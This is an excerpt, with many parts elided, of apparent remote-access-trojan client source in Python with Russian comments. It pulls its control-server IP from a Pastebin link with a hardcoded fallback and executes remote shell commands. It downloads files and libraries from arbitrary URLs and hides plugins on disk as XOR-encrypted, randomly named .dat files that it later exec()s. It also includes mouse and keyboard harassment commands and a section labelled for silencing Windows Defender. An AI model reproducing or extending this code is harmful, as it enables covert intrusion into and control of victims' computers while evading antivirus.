...
EXEC_URL = "https://pastebin.com/raw/xxxx" # Указать здесь свою ссылку
DEFAULT_IP = "111.11.11.111"  # Указать здесь свой запасной IP
DEFAULT_PORT = 7777   # Указать здесь свой запасной порт

def get_buffer_process():
    """
    Скачивает конфигурацию сервера с Pastebin.
    При провале возвращает запасные данные вместо выхода.
    """
    for attempt in range(5):
        try:
            ...
            logger.info(f"Успешно получена конфигурация из сети: {ip}:{port}")
            return ip, port
    ...
    # ВАЖНЫЙ ФИКС: Вместо sys.exit(1) возвращаем дефолт
    logger.warning("--- ПРЕДУПРЕЖДЕНИЕ ---")
    logger.warning(f"Не удалось получить данные из сети. Использую запасной сервер: {DEFAULT_IP}:{DEFAULT_PORT}")
    
    return DEFAULT_IP, DEFAULT_PORT

# Теперь переменные всегда получат значения
...
def enable_aggressive_keepalive(sock):
    ...
    Проверка начинается через 5 сек простоя, повторяется каждые 3 сек,
    если нет ответа — разрыв через ~15 сек.
    """
    try:
        # Включаем Keepalive
        ...
        # 1 = On
        # 5000 = слать keepalive пакет, если тишина 5 секунд
        # 3000 = если нет ответа, слать повторно каждые 3 секунды
...
def get_random_name():
    """Генерация случайного имени файла для обфускации на диске"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + ".dat"


def get_disabled_list():
    """Получение списка выключенных плагинов из конфига"""
    try:
...
def cmd_holdkey(args: str):
    """
    Зажимает одну или несколько клавиш на заданное время в фоновом потоке.

    Формат:
        /holdkey <секунды> <клавиша1> [клавиша2 ...]
    ...
    def _worker(keys, duration):
        try:
            ...
            logger.error(f"Ошибка в holdkey-потоке: {e}")
    ...
    try:
        ...
        try:
            ...
            duration = min(duration, 30.0)  # защита от дурака
        except ValueError:
            return "❌ Неверное значение времени (нужно число)."

        # --- клавиши ---
        keys = [k.strip().lower() for k in parts[1:] if k.strip()]
        if not keys:
            return "❌ Укажите хотя бы одну клавишу."
...
def cmd_mousemesstart(args):
    """
    Запускает хаотичное движение мыши в фоновом потоке.
    Остановка производится через существующую cmd_mousemesstop.
    """
...
def cmd_whereami(args):
    """
    /whereami
    Показывает пути к EXE, рабочей директории, модулям и библиотекам.
    """
    try:
        # Основные пути процесса
        exe_path = sys.executable
        work_dir = os.getcwd()
        
        # Вычисляем пути к системным папкам (SystemData)
        ...
        # Проверяем наличие папок для наглядности (ставим значок)
        def check_path(p):
...
def cmd_playsound(args, conn):
    ...
    if not args:
        # ИСПРАВЛЕНО: отправляем ответ явно, а не делаем return
        send_response(conn, "❌ Укажите путь к аудиофайлу.")
        return

    full_path = os.path.join(current_path, args.strip())

    if not os.path.isfile(full_path):
        # ИСПРАВЛЕНО: отправляем ответ явно
    ...
    if not _mixer_initialized:
        try:
            ...
            send_response(conn, "❌ Не удалось инициализировать аудио-микшер Pygame.")
            return
    ...
    def _playback():
        ...
        try:
            ...
            if not music_stop_event.is_set():
                ...
                send_response(conn, "🛑 Проигрывание остановлено вручную")

        except Exception as e:
            send_response(conn, f"❌ Ошибка во время воспроизведения: {e}")
...
def cmd_stopsound(args):
    ...
    # 1. Сначала ПРИНУДИТЕЛЬНО останавливаем сам звук в движке
    try:
        # Эта команда мгновенно обрывает звук, независимо от потоков
        pygame.mixer.music.stop() 
    except Exception:
        pass

    # 2. Теперь корректно завершаем поток наблюдения
    if music_thread and music_thread.is_alive():
        music_stop_event.set()
        # Дадим потоку время на завершение (он выйдет из while, так как музыка остановлена)
        music_thread.join(timeout=1)
        music_thread = None
...
# ====== Сердцебиение/отслеживание состония ======
def cmd_ping(args):
    """
...
def cmd_execute(args: str):
    """
    Выполняет системную команду в фоновом потоке.
    Главный цикл не блокируется и не отправляет ответ автоматически.
    """
    if not args:
    ...
    def _worker():
        def worker_send_response(message=None, is_error=False, is_file=False, file_path=None):
            if is_error:
                logger.error(f"Ошибка в /execute worker: {message}")
        ...
        try:
            ...
            if os.name == "nt" and is_gui_command:
                ...
                worker_send_response(
                    f"✅ GUI-приложение '{args}' запущено в фоновом режиме. Вывода не будет."
                )
                return
            ...
            response = (
                "\n\n".join(parts)
                if parts
                else f"Команда выполнена успешно, вывод отсутствует (код {result.returncode})."
            )
            ...
            worker_send_response(
                f"❌ Критическая ошибка выполнения команды: {e}",
                is_error=True
            )
    ...
    # КЛЮЧЕВО: ответ будет отправлен из worker
    return None
...
def cmd_download_link(args: str):
    """
    Скачивает файл по ссылке в отдельном потоке.
    Главный цикл НЕ отправляет ответ (возвращаем None).
    """
    # --- получаем актуальный сокет ---
    with socket_lock:
        conn = current_socket

    if not conn:
        return "Ошибка: нет активного соединения."
    ...
    def _worker():
        ...
        try:
            ...
            # чистим недокачанный файл
            try:
                if save_path and os.path.exists(save_path):
                    pass  # файл валиден, ничего не делаем
            except Exception:
                pass
...
# ==== Важные команды для глушения Win def`а ========
...
# ====== Работа плагинов/панели управления ======

def cmd_plugins_panel(args=None, conn=None):
    load_plugins() 
    if not MODULES_METADATA:
        return "📂 *Список модулей пуст.*"

    # Заголовок без блока кода
    report = "🛠 *Менеджер модулей*\n\n"
    
    for filename, info in MODULES_METADATA.items():
        # Статус красивыми значками
    ...
    report += "• `/pl_upd` — Перечитать диск"
    
    return report


def cmd_plugin_control(args, conn=None):
    if not args: return "⚠️ Используйте: `/pl_off id.dat`"
    
    parts = args.split()
    if len(parts) < 2: return "⚠️ Неверный формат."
    ...
    if action == "off":
        if plugin_id not in disabled:
            ...
            msg = f"🚫 Модуль `{plugin_id}` деактивирован."
    
    elif action == "on":
        if plugin_id in disabled:
            disabled.remove(plugin_id)
            save_disabled_list(disabled)
            msg = f"✅ Модуль `{plugin_id}` активирован."
        ...
        if os.path.exists(path):
            ...
            if plugin_id in disabled:
                disabled.remove(plugin_id)
                save_disabled_list(disabled)
            msg = f"🗑 Модуль `{plugin_id}` удален."
        else:
            msg = "❌ Файл не найден."

    # САМОЕ ВАЖНОЕ: Сразу обновляем реестр команд в памяти
    load_plugins()
    return msg if msg else "❓ Неизвестное действие."


def cmd_install_lib(args, conn=None):
    """
    Скачивает ZIP с библиотекой и распаковывает в /libs/
    Использование: /install_lib <URL_TO_ZIP>
    """
    if not args:
        return "⚠️ Укажите прямую ссылку на zip. Пример: /install_lib http://site.com/lib.zip"
    
    url = args.strip()
    libs_dir = os.path.join(os.getenv('APPDATA'), 'SystemData', 'libs')
    
    send_response(conn, f"⏳ Скачиваю библиотеку с {url}...")
    
    try:
        # 1. Скачиваем архив в память
        ...
        # 3. Принудительно обновляем пути (на всякий случай)
        if libs_dir not in sys.path:
            sys.path.insert(0, libs_dir)
            
        return f"✅ Библиотека установлена в {libs_dir}. \nТеперь плагины могут делать import."
...
def setup_libs_path():
    """Настройка папки библиотек с использованием модуля site"""
    ...
    # Использование site.addsitedir — это правильный способ добавления папок с библиотеками.
    # Это не просто добавляет путь в sys.path, но и обрабатывает .pth файлы 
    # и корректно настраивает пакеты.
    if os.path.exists(libs_dir):
        site.addsitedir(libs_dir)
        if libs_dir not in sys.path:
            sys.path.insert(0, libs_dir)
        logger.info(f"📚 Библиотеки подключены через addsitedir: {libs_dir}")


def cmd_plugins_reload(args=None):
    """Команда для ручного обновления списка плагинов и их шифрования"""
    try:
        # Вызываем нашу основную логику загрузки
        # (которую мы обновили в прошлый раз)
        load_plugins() 
        
        # Считаем, сколько сейчас команд в реестре для отчета
        count = len(COMMANDS_REGISTRY)
        return f"♻️ Реестр обновлен. Всего команд доступно: {count}. Новые модули зашифрованы и активны."
    except Exception as e:
        logger.error(f"Ошибка при перезагрузке плагинов: {e}")
        return f"❌ Ошибка при обновлении плагинов: {str(e)}"


def load_plugins():
    """Основной загрузчик: шифрует .py, маскирует имена и подгружает .dat"""
    global COMMANDS_REGISTRY, MODULES_METADATA
    
    # 1. Полная очистка реестра перед загрузкой. 
    # Мы берем чистую копию CORE_COMMANDS, чтобы "забыть" старые команды плагинов.
    COMMANDS_REGISTRY.clear()
    COMMANDS_REGISTRY.update(CORE_COMMANDS)
    
    # Очищаем метаданные для панели управления
    MODULES_METADATA = {}
    ...
    # Получаем актуальный список выключенных ID
    ...
    for file in os.listdir(plugins_dir):
        ...
        try:
            # --- БЛОК 1: ОБРАБОТКА ИСХОДНИКОВ .py ---
            if file.endswith(".py"):
                try:
                    # Читаем исходный код
                    ...
                    if not code.strip():
                        logger.error(f"⚠️ Файл {file} пуст или не читается.")
                        continue
            
                    # Шифруем код для маскировки на диске
                    encrypted_data = XOR_cipher(code.encode('utf-8', 'ignore'))
                    new_name = get_random_name() # Генерация случайного имени (например, a1b2c3d4e5.dat)
                    new_path = os.path.join(plugins_dir, new_name)
                    
                    with open(new_path, "wb") as f:
                        f.write(encrypted_data)
                    
                    # Удаляем оригинал .py после шифрования
                    os.remove(path)
                    logger.info(f"🔒 Модуль {file} зашифрован как {new_name}")
                    
                    # Переключаем указатели на новый зашифрованный файл для текущей итерации
                    file = new_name
                    path = new_path
                    
                except Exception as e:
                    logger.error(f"❌ Критическая ошибка при обработке .py {file}: {e}")
                    continue

            # --- БЛОК 2: ЗАГРУЗКА И ИСПОЛНЕНИЕ .dat ---
            if file.endswith(".dat"):
                ...
                # Расшифровываем код в память
                decrypted_code = XOR_cipher(encrypted_content).decode('utf-8', 'ignore')
                
                # Парсим "Паспорт" (Метаданные) из первых 15 строк кода
                m_name = file # По умолчанию имя — это ID файла
                m_desc = "Описание отсутствует"
                ...
                # Сохраняем информацию для панели управления /plugins
                ...
                # Если плагин не в черном списке — создаем модуль и регистрируем команды
                if is_active:
                    # Создаем виртуальный объект модуля
                    new_mod = types.ModuleType(file.replace(".dat", ""))
                    
                    # Прокидываем в модуль окружение клиента (библиотеки и функции)
                    ...
                    # Исполняем код плагина в контексте созданного модуля
                    exec(decrypted_code, new_mod.__dict__)
                    
                    # Если в плагине есть словарь PLUGINS, добавляем его в основной реестр
                    if hasattr(new_mod, "PLUGINS"):
                        COMMANDS_REGISTRY.update(new_mod.PLUGINS)
                        
        except Exception as e:
            logger.error(f"❌ Ошибка в модуле {file}: {e}")
...
CORE_COMMANDS = {
    ...
    "/pl_upd": cmd_plugins_reload, # Алиас
            ...
            while True:
                ...
                while b'\n' in buffer:
                    ...
                    try:
                        ...
                        if not func:
                            send_response(conn, f"❌ Неизвестная команда: {cmd_name}")
                            continue
                        ...
                        try:
                            ...
                            # Сценарий А: Функция хочет всё (payload, conn, buffer) -> обычно это загрузка файлов
                            if params_count >= 3:
                                result = func(payload, conn, buffer)
                                buffer = b'' # Очищаем буфер, так как он поглощен функцией
                            
                            # Сценарий Б: Функция хочет (args, conn) -> для потоковых или сложных команд
                            elif params_count == 2:
                                # Если команда должна работать в фоне (скриншоты, аудио и т.д.)
                            ...
                            result = f"❌ Ошибка выполнения {cmd_name}: {str(e)}"
                            logger.error(result)

                        # --- ОБРАБОТКА РЕЗУЛЬТАТА ---
                        
                        # Проверка на авто-отправку файлов для системных команд
                        ...
                        if result:
                            ...
                            if "✅ Клиент перезапускается." in str(result): 
                                logger.warning("Завершение процесса по команде сервера.")
                                os._exit(0)
                        ...
                        send_response(conn, f"❌ Ошибка парсинга: {str(e)}")
